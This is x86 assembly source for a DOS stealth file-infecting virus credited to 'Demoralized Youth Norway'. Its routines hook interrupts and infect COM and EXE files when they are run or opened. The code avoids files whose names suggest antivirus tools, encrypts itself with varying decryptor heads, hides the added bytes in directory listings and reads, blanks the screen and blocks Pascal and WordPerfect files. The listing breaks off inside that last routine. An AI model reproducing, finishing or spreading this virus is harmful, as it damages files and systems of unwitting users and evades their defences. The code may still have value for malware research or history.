sec     equ 28
ideal   equ 3*1024      ;every file will increase by this ammount of bytes

;           °°°°°°°          °°°°°°         °°°°°°°         °°°°°°°
;          °±±±±±±±°        °±±±±±±°       °±±±±±±±°       °±±±±±±±°
;         °±²²²²²²²±°      °±²²²²²²±°     °±²²²²²²²±°     °±²²²²²²²±°
;        °±²ÛÛÛÛÛÛÛ²±°    °±²ÛÛÛÛÛÛ²±°   °±²ÛÛÛÛÛÛÛ²±°   °±²ÛÛÛÛÛÛÛ²±°
;        °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°
;        °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²²²²±°   °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°
;        °±²ÛÛÛÛÛÛÛ²±°   °±²ÛÛÛÛ²±±±°    °±²ÛÛÛÛÛÛÛ²±°   °±²ÛÛÛÛÛÛÛ²±°
;        °±²ÛÛÛÛ²²²±°    °±²ÛÛÛÛ²²²²±°   °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°
;        °±²ÛÛÛÛ²±±°     °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°  °±²ÛÛÛÛ²ÛÛÛ²±°
;        °±²ÛÛÛÛ²±°       °±²ÛÛÛÛÛÛ²±°   °±²ÛÛÛÛÛÛÛ²±°   °±²ÛÛÛÛÛÛÛ²±°
;         °±²²²²±°         °±²²²²²²±°     °±²²²²²²²±°     °±²²²²²²²±°
;          °±±±±°           °±±±±±±°       °±±±±±±±°       °±±±±±±±°
;           °°°°             °°°°°°         °°°°°°°         °°°°°°°
;
Ver equ 11
;

cpt1            equ $           ;Checkpoint 1

enc_start       equ $
org 100h
                call    dummyjmp1

marker  db 0    ;com / exe marker (0=com, 1=exe)

dummyjmp1:      pop bx

                cmp     byte [bx],0
                je      is_a_com

                mov     ax,es
                add     ax,0
exe_cpt1 equ $-2
                push    ax
                mov     ax,0
exe_cpt2 equ $-2
                push    ax

                push    es
                pop     ds
                jmp     cont_install

is_a_com:
                push   cs
                mov    ax,100h
                push   ax

cont_install:
                push    ds

                push    cs
                pop     ds

                call    one_three

                mov     ax,0C001h
                mov     bx,ax
                add     ax,07DFFh

                db 0EBh,01,0EBh

                int     21h

                db 0E9h,1,0,0B8h

                cmp     bx,0D00Dh
                je      startup_fail

                call    one_three

;               cmp     sp,-10h
;               jb      startup_fail

                mov     ax,es
                dec     ax
                mov     es,ax
                cmp     byte es:[0000h],'Z'
                jne     startup_fail

                mov     ax,es:[0003h]
                sub     ax,tsr_para
                jc      startup_fail

                mov     es:[0003h],ax
                sub     word ptr es:[0012h],tsr_para
                mov     es,es:[0012h]

                call    one_three

                call    $+3

cpt3            equ $           ;Checkpoint 3

                pop     si
                sub     si,(cpt3-cpt1)
                mov     bx,si
                add     si,(cpt4-cpt1)
                push    cs
                push    si

                mov     si,bx
                mov     cx,offset total-100h
                mov     di,100h
                push    es
                rep     movsb
                mov     di,offset init
                push    di

                retf
cpt4            equ $           ;Checkpoint 4

startup_fail:
                call    $+3
dummycpt1       equ $-offset marker
                sub     ax,ax
                xor     bx,bx
                sub     cx,cx
                xor     dx,dx
                xor     di,di
                sub     bp,bp
                pop     si
                pop     ds
                push    ds
                pop     es
                cmp     byte cs:[si-dummycpt1],1
                je      file_is_exe

                mov     word [100h],20CDh
rpl1            equ     $-2
                mov     byte [102h],90h
rpl2            equ     $-1

file_is_exe:
                sub     si,si
                retf

cpt2            equ $           ;Checkpoint 2

;****************************************************************************
;*              Data Area                                                   *
;****************************************************************************

;sft             equ     005Ch   ;3Ah

ofs_scan_crc    equ     0050h   ;+3
ofs_chk_ver     equ     0053h   ;+1              version number
ofs_chk_size    equ     0054h   ;+2              version size
ofs_chk_sig     equ     0056h   ;+4              signature

header          equ     005Ah
ofs_first_3     equ     005Ah   ;+3              three first bytes in COM
ofs_time        equ     008Dh   ;+2
ofs_date        equ     008Fh   ;+2
ofs_attr        equ     0091h   ;2

sft_attr        equ     04h     ;(byte)
sft_time        equ     0Dh     ;(word)
sft_date        equ     0Fh     ;(word)
sft_size        equ     11h     ;(dword)

;                        ;CRC signature added by "SCAN /AV"
;scan_sig        db      0f0h,0fdh,0c5h,0aah,0ffh,0f0h

set_sgm:        push cs
                push ds


f_size          dw      0
bb_stat         db      0
cntr            dw      0
r_cntr          dw      0,0

;;; DISK S. DATA ;;;
x_first3        db '   '
x_version       db  0
x_size          dw  0
x_sig           db '    '

stat            db 0
stat2           db 0

handle  dw 0

_handle         dw 0
;_dx             dw 0
;_ds             dw 0
_bytes          dw 0
val_len         dw 0,0
pos             dw 0,0
pos2            dw 0,0

append          dw 0

stealth1st      dw 0

;;;DISK S DATA ENDS;;;

;db 'Only The Good Die Young'


jmp_to  dw 0

push_all:
        pop     cs:[jmp_to]
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        push    bp
        jmp     cs:[jmp_to]

pop_all:
        pop     cs:[jmp_to]
        pop     bp
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     cs:[jmp_to]





handle_dir:
                popf
                call    int21

                pushf
                jnc     back_handle_dir

;                cmp     ax,0
;                jne     back_handle_dir

                call    stealth_dir_handle
                sti
back_handle_dir:
                popf
                iret

fcb_dir:
                popf
                call    int21

                pushf
                cmp     al,00h
                jne     back_fcb_dir

                call    stealth_dir_fcb
                sti
back_fcb_dir:
                popf
                iret




;****************************************************************************
;*              Interupt 24 handler                                         *
;****************************************************************************
ni24:           mov     al,3
                iret

;****************************************************************************
;*              Call OLD Interrupt 21 Handler
;****************************************************************************
int21:
        pushf
        call    dword ptr cs:org21
        ret

;****************************************************************************
;*              Interupt 21 handler                                         *
;****************************************************************************
ni21:           pushf

;cmp ah,40h
;je __read

;jmp no_fcb12 ;no_bogus

                cmp     ah,11h
                jne     no_fcb11
                jmp     fcb_dir
no_fcb11:
                cmp     ah,12h
                jne     no_fcb12
                jmp     fcb_dir
no_fcb12:

jmp no_bogus

                cmp     ah,03Fh
                jne     no_bogus
__read:         jmp     _read

no_bogus:
                cmp     ah,03Eh
                jne     body
                cmp     bx,0C001h

                jne     body
                mov     bx,0D00Dh
                popf
                stc
                retf    2

o24     dw 0,0
o13     dw 0,0

body:
                call    push_all

                push    ax
                push    ds
                push    dx
                push    es
                push    bx

                xor     ax,ax
                mov     es,ax
                les     bx,es:[24h*4]

                mov     cs:o24[0],bx
                mov     cs:o24[2],es
                mov     ax,2524h
                mov     dx,offset ni24
                push    cs
                pop     ds
                call    int21
                pop     bx
                pop     es
                pop     dx
                pop     ds
                pop     ax


                cmp     ah,3Eh                  ;close ?
                jne     vvv
                cmp     bx,5
                jl      exit

                mov     ah,45h                  ;duplicate handle
                jmp     doit
vvv:            cmp     ah,56h                  ;rename ?
                je      dsdx
                cmp     ah,43h                  ;chmod ?
                je      dsdx
                cmp     ah,3Dh
                jne     not_open

                call    pas_wp
not_open:
             ;   cmp     ah,3Dh                  ;open ?
             ;   je      dsdx
                cmp     ax,4B00h                ;execute ?
                jne     exit

dsdx:           mov     ax,3D00h                ;open the file
doit:           call    int21
                jc      exit
                xchg    ax,bx
                jmp     infect

exit:
                call    reset_i24

glemmdet:
                call    pop_all
alfa:
                popf

                db 0EAh                         ;JMP FAR xxxx:xxxx
org21           dw 0,0


avslussen:      mov ah,4Ch
                int 21h

one_three:
                ret
                pushf
                push ax
                push ds
                push dx

                push cs
                pop ds

                call $+3
                pop  dx
                sub dx,($-1)-offset avslussen
                push cs
                pop ds

                mov ax,2501h
                int 21h
                inc al
                inc al
                int 21h

                pop dx
                pop ds
                pop ax
                popf
                ret


db 'PCBB v11 (c) Hannibal Lechter of Demoralized Youth Norway'

;****************************************************************************
;*              Try to stealth a HANDLE READ (3Fh)
;****************************************************************************
_read:
                cmp     cs:stat,1
                je      alfa
                mov     cs:stat,1
                cmp     bx,5
                jl      alfa
                jcxz    alfa

                mov     cs:stat2,0
                call    read
                cmp     cs:stat2,0
                je      back2

                popf
                pushf
                call    dword ptr cs:org21
                jc back3

                pushf
                call    push_all

                push    ds
                pop     es
                push    cs
                pop     ds

                mov     bx,pos[0]
                mov     cx,stealth1st[0]

                mov     di,dx
                add     di,bx
                mov     si,offset header ;x_first3
                add     si,bx

                cld
first_b2:
                movsb
                dec     cx
                jcxz    first_b1
                inc     bx
                cmp     bx,24
                jl      first_b2
first_b1:
                call    pop_all
                popf
back3:
                mov     cs:stat,0
                mov     cs:stat2,0
                iret
back2:
                mov     cs:stat,0
                mov     cs:stat2,0
                jmp     alfa

;****************************************************************************
;*              Close the file
;****************************************************************************
close:
                push    cx
                push    dx

                mov     ax,5701h
                mov     cx,word cs:[ofs_time]
                mov     dx,word cs:[ofs_date]
                call    int21

;                mov     al,byte cs:[ofs_attr]
;                mov     byte [di+4],al

;               mov     ax,4301h
;               mov     cx,word cs:[ofs_attr]
;               call    int21

                pop     dx
                pop     cx

                mov     ah,3Eh
                call    int21
                ret


;db 'Now I lay me down to sleep, I pray the lord my soul to keep, If I die before '
;db 'I wake, I pray the lord my soul to take'

infect:         cld

                mov     cs:handle,bx

                mov     ax,5700h
                int     21h
                mov     word cs:[ofs_time],cx
                mov     word cs:[ofs_date],dx


;start NOP'ing here...
;              push    es
;              push    bx
;
;              mov     ax,3513h
;              int     21h
;
;              mov     cs:o13[0],bx
;              mov     cs:o13[2],es
;
;              mov     ah,13h
;              int     2Fh
;              push    es
;              push    bx
;              int     2Fh
;              pop     dx
;              pop     ds
;              mov     ax,2513h
;              int     21h
;
;              pop     bx
;              pop     es
;
;stop NOP'ing here...

                mov     ax,1220h                        ;get file-table entry
                push    bx
                push    ax
                int     2Fh
                mov     bl,es:[di]
                pop     ax
                sub     al,0Ah
                int     2Fh
                pop     bx

                push    es
                pop     ds

                push    [di+2]                          ;save attr & open-mode
                push    [di+4]

                mov     al,[di+4]
                mov     byte cs:[ofs_attr],al

                cmp     word [di+sft_size+2],0
                jne     close1v
                mov     ax,word [di+sft_size]
                cmp     ah,0F0h
                ja      close1v
                cmp     ah,0
                jl      close1v

                mov     cs:f_size,ax

                cmp     word ptr [di+28h],'XE'
                jne     not_exe
                cmp     word ptr [di+2Ah],'E'
                je      check_name

not_exe:        cmp     word ptr [di+28h],'OC'
                jne     close1v  ;jne
                cmp     byte ptr [di+2Ah],'M'
check:          je      check_name
close1v:        jmp     close1

check_name:     cmp     byte ptr [di+20h],'V'           ;name is V*.* ?
                je      close1v
                cmp     byte ptr [di+20h],'F'           ;name is F*.* ?
                je      close1v

                mov     cx,7                            ;name is *SC*.* ?
                mov     ax,'CS'
                push    di
                add     di,21h
                cld
SCloop:         dec     di
                scasw
                loopnz  SCloop
                pop     di
                je      close1v

                mov     byte ptr [di+2],2               ;open for read/write
                mov     byte ptr [di+4],0               ;clear attributes

                cld
                jmp     read_info
_call1:
                jc      close2
;                push    [di+0Dh]
;                push    [di+0Fh]

                jmp     patch_it
_call0:
;                pop     [di+0Fh]
;                pop     [di+0Dh]
close2:

                push    es                              ;close after infection
                pop     ds

                or      byte ptr [di+6],40h             ;no time-change

;                pop     [di+4]
;                pop     [di+2]
;                push    [di+2]
;                push    [di+4]

close1:         call    close                           ;normal close

                or      byte ptr [di+5],40h     ;no EOF on next close
                pop     [di+4]                  ;restore attribute & open-mode
                pop     [di+2]

;start NOP
;              lds     dx,cs:o13[0]
;              mov     ax,2513h
;              call    int21
;stop NOP


                jmp     exit

read_info:
                push    ds

                push    ds      ;(ds)
                pop     es

                push    cs
                pop     ds

                mov     ah,3Fh
                mov     cx,18h
                mov     dx,ofs_first_3
                call    int21
                jc      failed
                cmp     al,18h
                jne     failed

                xchg    cx,ax
                shr     cx,1
                mov     si,ofs_first_3
                mov     di,offset dummy

encr_l8b:
                lodsw
                xor     ax,'IF'
                xor     ax,'HS'
                xor     ax,'W&'
                xor     ax,'AH'
                xor     ax,'EL'
                mov     [di],ax
                inc     di
                inc     di
                loop    encr_l8b

                mov     ax,4202h
                mov     cx,-1
                mov     dx,-10
                call    int21
                jc      failed

                mov     ah,3Fh
                mov     cx,10
                mov     dx,ofs_scan_crc
                call    int21
                jc      failed
                cmp     al,10
                jne     failed

                mov     ax,word ptr [ofs_first_3]
                not     ax

                cmp     word ptr [ofs_chk_sig],'CP'     ;is word [EOF-4] = 'PC' ?
                jne     not_infected
                cmp     word ptr [ofs_chk_sig+2],'BB'   ;is word [EOF-2] = 'BB' ?
                jne     not_infected
                jmp     failed

not_infected:
                pop     ds
                clc
                jmp     _call1
failed:
                pop     ds
                stc
                jmp     _call1

;db 13,10
;db "Whoe to you of earth and sea...",13,10
;db "For the devil sends the beast with wrath,",13,10
;db "Because he knows the time is short...",13,10
;db "The people who have understanding,",13,10
;db "Reckon the number of the beast,",13,10
;db "Because it is a secret number...",13,10
;db "It's number is six-hundred and sixty-six!",13,10,36

db 'When you are demoralized....   there is NO way out!',13,10,36

;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ                       Keyboard (Int 09h) Handler                       ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³
key_rout:
                pushf

                inc     cs:r_cntr[0]
                adc     cs:r_cntr[2],0

                inc     cs:cntr
                cmp     cs:cntr,offset total
                jl      key_b1
                mov     cs:bb_stat,1
                mov     cs:cntr,0
key_b1:
                cmp     cs:bb_stat,0
                je      key_b2

                push    ax
                push    cx
                push    dx
                push    ds

                xor     ax,ax
                mov     ds,ax
                mov     al,byte ptr [417h]
                and     al,15
                cmp     al,15
                jne     key_b3

                mov     cs:bb_stat,0

                mov     dx,3DAh
                in      al,dx
                mov     dx,3BAh
                in      al,dx
                mov     dx,3C0h
                mov     al,20h
                out     dx,al
key_b3:
                pop     ds
                pop     dx
                pop     cx
                pop     ax
key_b2:
                popf

                db      0EAh
old_key         dw      0,0                     ;old KBD vector


;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ                      Timer Tick (Int 1Ch) Handler                      ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³
tmr_rout:
                pushf

                cmp     cs:bb_stat,0
                je      tmr_b1

                push    ax
                push    dx

                mov     dx,3DAh
                in      al,dx
                mov     dx,3BAh
                in      al,dx
                mov     dx,3C0h
                mov     al,0
                out     dx,al                   ;0 = off, 32 = on

                pop     dx
                pop     ax
tmr_b1:
                popf
                db      0EAh
                oldh    dw 0,0                  ;Old TIMER-TICK vector

enc_data db 011h,009h,00Dh,0E8h,000h,000h,05Eh,081h,0C6h,00Eh,000h,0B9h,000h
         db 000h,080h,034h,000h,046h,0E2h,0FAh,013h,009h,00Fh,0E8h,000h,000h
         db 05Bh,081h,0C3h,010h,000h,0B9h,000h,000h,033h,0F6h,080h,030h,000h
         db 046h,0E2h,0FAh,015h,004h,012h,0E8h,000h,000h,0B9h,000h,000h,089h
         db 0E5h,081h,046h,000h,012h,000h,05Eh,046h,080h,074h,0FFh,000h,0E2h
         db 0F9h,015h,001h,012h,0B9h,000h,000h,089h,0E5h,0E8h,000h,000h,081h
         db 046h,0FEh,00Dh,000h,05Bh,043h,080h,077h,0FFh,000h,0E2h,0F9h,016h
         db 001h,013h,0B9h,000h,000h,08Bh,0DCh,0E8h,000h,000h,036h,081h,047h
         db 0FEh,00Eh,000h,05Bh,043h,080h,077h,0FFh,000h,0E2h,0F9h,019h,001h
         db 016h,0B9h,000h,000h,08Bh,0DCh,0E8h,000h,000h,083h,0EBh,004h,036h
         db 081h,047h,002h,011h,000h,05Fh,047h,080h,075h,0FFh,000h,0E2h,0F9h
         db 01Dh,009h,014h,0FCh,0EBh,002h,0C6h,006h,0E8h,000h,000h,0B9h,000h
         db 000h,05Eh,081h,0C6h,015h,000h,0EBh,001h,0CDh,0B4h,000h,0ACh,032h
         db 0C4h,088h,044h,0FFh,0E2h,0F8h

encr_h_ofs      dw 0
encr_h_cx       db 0
encr_h_xor      db 0
encr_h_len      db 0

repl0:          db      0E8h,0,0
repl1:          jmp near 0100h

patch_it:
                push    di
                push    si
                push    ds

                push    cs
                pop     ds

                mov     marker,0

                cmp     word [ofs_first_3],'MZ'
                je      exe_calc
                cmp     word [ofs_first_3],'ZM'
                je      exe_calc

                mov     ax,f_size
                sub     ax,3
                mov     repl0[1],ax

                mov     ax,word [ofs_first_3]
                mov     dl,byte [ofs_first_3+2]

                mov     [offset rpl1],ax
                mov     [offset rpl2],dl
                jmp     j_encrypt

oldl0   dw 0
oldl2   dw 0

exe_calc:
                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx
                call    int21

                mov     oldl0,ax
                mov     oldl2,dx

                push    ax
                push    dx

                mov     ax,word [header+16h]
                add     ax,10h
                mov     word [exe_cpt1],ax
                mov     ax,word [header+14h]
                mov     word [exe_cpt2],ax

                pop     dx
                pop     ax
                push    ax
                push    dx

                add     ax,ideal
                adc     dx,0

;                mov     ax,oldl0
                mov     cx,512
                div     cx
                inc     ax
                mov     word [header+4],ax
                mov     word [header+2],dx

                pop     dx
                pop     ax

                mov     cx,16
                div     cx
                sub     ax,word [header+8]
                mov     word [header+16h],ax
                mov     word [header+14h],dx

                mov     marker,1

j_encrypt:
                call    encrypt                         ;encrypt & write
                sahf
                jc      no_write_1st

                mov     ax,4200h
                xor     cx,cx
                mov     dx,cx
                call    int21

                cmp     marker,1
                je      exe_jump

                mov     ah,40h
                mov     cx,3
                mov     dx,offset repl0                 ;write "CALL" head
                call    int21
                jmp     alldone

exe_jump:       mov     ah,40h
                mov     cx,18h
                mov     dx,ofs_first_3
                int     21h
alldone:
                and     byte cs:[ofs_time],255-31
                or      byte cs:[ofs_time],sec
no_write_1st:
                pop     ds
                pop     si
                pop     di
                sahf
                jmp     _call0;                ret

;db 'Blessed is the one who expects nothing, for he shall not be dissapointed$'

;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ                             Encrypt & Write                            ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³
encrypt:
                push    ds                      ;Save DS & ES
                push    es

                push    cs                      ;DS = ES = CS
                push    cs
                pop     ds
                pop     es

                push    bx                      ;Save BX

                cld
                call    choose_encryption_head  ;Choose encryption head
get_enc_key:
                db      0E4h,40h
                cmp     al,0
                je      get_enc_key

                mov     bh,0                    ;BH = 0
                mov     bl,encr_h_xor           ;BL = internal XOR-ofs
                mov     byte [si+bx],al         ;b [Si+Bx] = Encr. key
                mov     bl,encr_h_cx            ;BL = internal CX-ofs
                mov     word [si+bx],offset total-10Ah ;w [Si+Bx] = Encr.length
                xchg    di,ax                   ;DI = AX

                pop     bx
                push    bx

                push    ax
                push    di
                cld
                mov     di,offset total
                mov     cx,2048
                mov     al,''
                rep     stosb
                pop     di

                xor     ch,ch
                mov     cl,encr_h_len
                add     cx,offset total-100h
                xchg    cx,ax
                mov     cx,ideal
                sub     cx,ax
                mov     ah,40h
                mov     append,cx
                mov     dx,offset total
                mov     word [total],1F0Eh
                call    int21
                pop     ax

                mov     ah,40h                  ;Write to handle
                pop     bx                      ;restore handle number
                xor     ch,ch                   ;CH = 0
                mov     cl,encr_h_len           ;CL = Length of de-garbler
                mov     dx,si                   ;DX = Offset to de-garbler-head
                call    int21                   ;Call DOS

                lahf                            ;AH = FLAGS
                cmp     al,cl                   ;All bytes written?
                je      success                 ;yes, then degarbler written

                sahf                            ;FLAGS = AH
                jnc     success                 ;If no error, then...
                stc                             ;...set CY, and...
                ret                             ;...return.
success:
                xchg    di,ax                   ;DI = AX
                xchg    al,ah                   ;Exchange AL with AH
                mov     si,100h                 ;SourceIndex = 100h
                mov     di,offset total         ;DI = End-Of-Code
                mov     cx,offset total-11Fh    ;Encryption length
encrypt_l:
                lodsb                           ;al = [SI], si: +1
                xor     al,ah                   ;garble byte
                stosb                           ;[DI] = al, di: +1
                loop    encrypt_l               ;and again....

                xor     cx,cx
                mov     cl,encr_h_len
                add     cx,(offset total)-100h
                add     cx,append
                mov     size,cx

                mov     cx,31                   ;the last bytes remain
                rep     movsb                   ;degarbeled

                mov     ah,40h                  ;Write to handle
                mov     cx,offset total-100h    ;CX = Bytes
                mov     dx,offset total         ;DX = Garbeled code
                call    int21                   ;Call Dos
                clc
                lahf
                cmp     al,cl                   ;all bytes written?
                je      encr_b1
                stc
                lahf
encr_b1:
                pop es                          ;restore ES & DS
                pop ds
                sahf
                ret                             ;return


;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ  Choose which encryption-head to use with this generation, and store   ÛÞ³
;³ÝÛ  the pointer and the two internal offsets for later use.               ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³
choose_encryption_head:
                mov     ah,2Ah                  ;get date
                call    int21                   ;using DOS
                xor     ah,ah                   ;clear bits 9-16 of AX
                mov     cx,ax                   ;copy AX into CX
                inc     cx
                and     cl,7
                mov     si,offset enc_data      ;point SI to Enc_Data

                cld                             ;clear direction flag

lete_etter_enc:
                lodsb                           ;al=[si] , si=si+1
                add     si,ax                   ;si = si + ax
                inc     si                      ;si = si + 1
                inc     si                      ;si = si + 1
                loop    lete_etter_enc          ;continue the searching ...

funnet_riktige:
                sub     si,ax
                dec     si
                dec     si

                mov     encr_h_len,al
                lodsb                           ;load the CX offset
                mov     encr_h_cx,al
                lodsb                           ;load the XOR offset
                mov     encr_h_xor,al
                mov     encr_h_ofs,si
                ret


;db 'Eddie lives... Somewhere in time...'

init:
                cli
                xor     ax,ax
                mov     ds,ax
                mov     si,9*4
                mov     di,offset old_key
                movsw
                movsw
                add     si,(1Ch*4)-(9*4)-4
                mov     di,offset oldh
                movsw
                movsw
                add     si,(21h*4)-(1Ch*4)-4
                mov     di,offset org21
                movsw
                movsw

                mov     word [09h*4+2],cs
                mov     word [09h*4],  offset key_rout

                mov     word [1Ch*4+2],cs
                mov     word [1Ch*4],  offset tmr_rout

                mov     word [21h*4+2],cs
                mov     word [21h*4],  offset ni21
                sti

                retf


;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ              Disk Stealth:  Read from handle (Int 21h,3Fh)             ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³
read:
                call    push_all

                mov     cs:_handle,bx
                mov     cs:_bytes,cx

                push    cs
                pop     ds

                mov     ax,1220h
                push    bx
                push    ax
                int     2Fh
                mov     bl,es:[di]
                pop     ax
                sub     al,0Ah
                int     2Fh
                pop     bx

                cmp     word ptr [di+28h],'OC'
                jne     j_dso1
                cmp     byte ptr [di+28h+2],'M'
                je      j_dso0
j_dso1:
                cmp     word ptr [di+28h],'XE'
                jne     j_dso3
                cmp     byte ptr [di+28h+2],'E'
                je      j_dso0
j_dso3:
                jmp     phocked

j_dso0:
                push    es:[di+15h]
                push    es:[di+17h]
                push    es:[di+2h]
                or      byte es:[di+2],3

                mov     ax,es:[di+15h]
                mov     pos[0],ax
                mov     ax,es:[di+17h]
                mov     pos[2],ax

                mov     ax,es:[di+11h]
                mov     cx,es:[di+13h]

                sub     ax,31
                sbb     cx,0
                mov     es:[di+15h],ax
                mov     es:[di+17h],cx

                mov     ah,3Fh
                mov     cx,31
                mov     dx,header
                call    int21
                jnc     read_b1
read_b2:
                jmp     done_it
read_b1:
                cmp     al,31
                jne     read_b2
                cmp     byte [header+18h],11
                jl      read_b2

                cmp     word ptr [header+1Bh],'CP' ;[X_sig]
                jne     read_b2
                cmp     word ptr [header+1Bh+2],'BB' ;[X_sig+2]
                jne     read_b2

                mov     si,header
                push    cx
                mov     cx,12
decr_l8b:
                lodsw
                xor     ax,'EL'
                xor     ax,'AH'
                xor     ax,'W&'
                xor     ax,'HS'
                xor     ax,'IF'
                mov     [si-2],ax
                loop    decr_l8b
                pop     cx

                cmp     word ptr pos[2],0

                jne     vid4
                cmp     word pos[0],23 ;2

                ja      vid4

                mov     stat2,1

                mov     ax,pos[0]
                mov     bx,_bytes
                cmp     bx,24
                jb      vid5
                mov     bx,24
vid5:
        sub     bx,ax
        mov     stealth1st[0],bx
vid4:
                mov     ax,es:[di+11h]
                mov     dx,es:[di+13h]
                sub     ax,[header+19h] ;[x_size]
                sbb     dx,0
                mov     val_len[0],ax
                mov     val_len[2],dx

                mov     bx,pos[0]
                mov     cx,pos[2]

                cmp     cx,dx
                jbe     vid2
                mov     _bytes,0
                jmp     done_it
vid2:
                cmp     cx,dx
                jne     vid3
                cmp     bx,ax
                jb      vid3
                mov     _bytes,0
                jmp     done_it
vid3:
                mov     ax,val_len[0]
                mov     dx,val_len[2]

                mov     bx,pos[0]
                mov     cx,pos[2]
                add     bx,_bytes
                adc     cx,0

                cmp     cx,dx
                jae     vid
                mov     _bytes,0
                jmp     done_it

vid:
                cmp     cx,dx
                jne     done_it

                cmp     ax,bx
                jae     done_it

                sub     bx,ax
                sub     _bytes,bx

done_it:
                pop     es:[di+2]               ;restore SFT data's
                pop     es:[di+17h]
                pop     es:[di+15h]
phocked:
                call    pop_all

                mov     cx,cs:_bytes            ;change CX (if of any use)

                ret                             ;return


;³ÝÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÞ³
;³ÝÛ                               DIR Stealth                              ÛÞ³
;³ÝÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÞ³

stealth_dir_handle:
                jc done_stealthing_handle

                pushf
                call    push_all

                mov     ah,2Fh
                call    int21
                mov     ax,word ptr es:[bx+16h]
                and     al,31
                cmp     al,sec
                jne     done_stealthing_handle

                cmp     word es:[bx+1Ah],3*1024
                jc      done_stealthing_handle
                sub     word es:[bx+1Ah],3*1024
                sbb     word es:[bx+1Ch],0

done_stealthing_handle:
                jmp     done_stealthing_fcb

stealth_dir_fcb:
                pushf
                call    push_all

                mov     ah,2Fh
                call    int21

                cmp     byte es:[bx],0FFh       ;extended fcb?
                jne     no_ext_fcb
                add     bx,7
no_ext_fcb:
                mov     al,byte ptr es:[bx+17h]
                and     al,31
                cmp     al,sec
                jne     done_stealthing_fcb

                cmp     word es:[bx+1Dh],3*1024
                jc      done_stealthing_fcb
                sub     word es:[bx+1Dh],3*1024
                sbb     word es:[bx+1Fh],0

done_stealthing_fcb:
                call    pop_all
                popf
                ret


reset_i24:      push    ds
                push    dx
                push    ax
                lds     dx,cs:o24[0]

                mov     ax,2524h                ;restore int 24 vector
                call    int21
                pop     ax
                pop     dx
                pop     ds
                ret

wpbuff  db '   '
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;                Deny access to any PASCAL or WORD PERFECT files
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
PAS_WP:
                xchg    bx,ax

                mov     si,dx
                cld
search_pas:
                lodsw
                dec     si

                cmp     al,0
                je      not_pas
                cmp     ah,0
                je      not_pas

                and     ax,0DFDFh

                cmp     ax,'P.' and 0DFDFh
                jne     search_pas
                mov     ax,word [si+1]
                and     ax,0DFDFh
                cmp     ax,'SA'
                je      fuck_wp
not_pas:
                xchg    bx,ax
                call    int21
                jc      not_wp

                xchg    bx,ax
                cmp     bx,5
                jb      not_wp

                xor     si,si

                mov     ah,3Fh
                mov     cx,3
                push    cs
                pop     ds
                mov     dx,offset wpbuff
                call    int21

                jc      close_wp
